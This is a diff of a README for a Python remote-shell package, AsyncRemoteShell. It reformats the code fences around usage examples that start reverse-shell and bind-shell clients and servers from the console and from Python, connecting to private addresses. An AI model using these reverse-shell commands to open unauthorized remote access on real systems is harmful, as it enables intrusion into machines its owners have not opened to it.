@@ -28,29 +28,33 @@ With System Terminal/System Console :
 - ``` ReverseShellClient --interface=127.0.0.1 --port=45678 ```
 - ``` ReverseShellServer -i=localhost -p=45678 ```
 - ``` ShellClient 10.0.0.2 56789 ```
-- ``` ShellServer --interface= -p=56789 ```
+- ` ShellServer --interface= -p=56789 `
 
 With python 3 :
 - ```python
 from AsyncRemoteShell import ReverseShellClient
 import asyncore
 ReverseShellClient("10.0.0.2", 45678) # host and port is required
-asyncore.loop()```
+asyncore.loop()
+```
 - ```python
 from AsyncRemoteShell import ReverseShellServer
 import asyncore
 ReverseShellServer("", 45678) # interface and port is required
-asyncore.loop()```
-- ```python
+asyncore.loop()
+```
+- ```python 
 from AsyncRemoteShell import ShellClient
 import asyncore
 ShellClient("10.0.0.2", 45678) # host and port is required
-asyncore.loop()```
-- ```python
+asyncore.loop()
+```
+- ```python 
 from AsyncRemoteShell import ShellServer
 import asyncore
 ShellServer("", 45678) # interface and port is required
-asyncore.loop()```
+asyncore.loop()
+```
 
 ## Why Asynchronous Shell
 You can install this package on Windows and execute this script :
